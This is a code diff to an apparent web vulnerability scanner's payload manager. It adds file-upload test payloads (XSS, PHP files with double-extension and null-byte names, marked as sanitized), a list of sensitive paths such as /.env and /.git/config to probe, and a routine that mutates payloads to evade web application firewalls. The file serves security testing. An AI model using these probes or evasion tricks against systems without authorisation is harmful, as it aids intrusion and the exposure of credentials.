@@ -248,7 +248,76 @@ class PayloadManager:
             # Session fixation
             "PHPSESSID=attacker_session",
         ]
+        
+        # 2025: File Upload Payloads (Unrestricted Upload)
+        # NOTE: Payloads are sanitized to prevent AV deletion
+        self.file_upload_payloads = [
+            # HTML/JS (Stored XSS)
+            {"name": "exploit.html", "content": "<script>alert('XSS')</script>"},
+            # PHP Web Shell (Simulated)
+            {"name": "shell.php", "content": "<?php echo 'Vulnerable to RCE'; ?>"},
+            # Python Reverse Shell (Simulated)
+            {"name": "rev.py", "content": "print('Vulnerable to RCE')"},
+            # SVG XSS
+            {"name": "image.svg", "content": "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>"},
+            # Double Extension
+            {"name": "malware.jpg.php", "content": "<?php phpinfo(); ?>"},
+            # Null Byte Injection
+            {"name": "shell.php%00.jpg", "content": "<?php phpinfo(); ?>"},
+        ]
+        
+        # 2025: OSINT / Recon Payloads
+        self.osint_files = [
+            "/.git/config",
+            "/.env",
+            "/backup.sql",
+            "/database.sqlite",
+            "/ds_store",
+            "/robots.txt",
+            "/sitemap.xml",
+            "/.vscode/settings.json",
+            "/server-status",
+            "/phpinfo.php"
+        ]
 
+    def get_file_upload(self) -> Dict[str, str]:
+        """Get a file upload payload (2025 OWASP A06)"""
+        return random.choice(self.file_upload_payloads)
+        
+    def get_osint_files(self) -> List[str]:
+        """Get list of sensitive files for OSINT scanning"""
+        return self.osint_files
+
+    def mutate_payload(self, payload: str) -> str:
+        """
+        CREATIVITY ENGINE: Mutates a payload to bypass WAFs.
+        Randomly applies obfuscation techniques.
+        """
+        mutation_type = random.choice(["case", "url_encode", "comment", "whitespace", "double_encode"])
+        
+        if mutation_type == "case":
+            # Randomly toggle case: <script> -> <ScRiPt>
+            return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
+            
+        elif mutation_type == "url_encode":
+            # Encode special characters
+            import urllib.parse
+            return urllib.parse.quote(payload)
+            
+        elif mutation_type == "comment":
+            # SQLi specific: Insert comments
+            return payload.replace(" ", "/**/")
+            
+        elif mutation_type == "whitespace":
+            # Replace spaces with tabs or newlines
+            return payload.replace(" ", random.choice(["%09", "%0a", "%0d", "+"]))
+            
+        elif mutation_type == "double_encode":
+            # Double URL encode
+            import urllib.parse
+            return urllib.parse.quote(urllib.parse.quote(payload))
+            
+        return payload
 
     def get_sqli(self, complexity: str = "simple") -> str:
         """Get an SQLi payload based on complexity"""
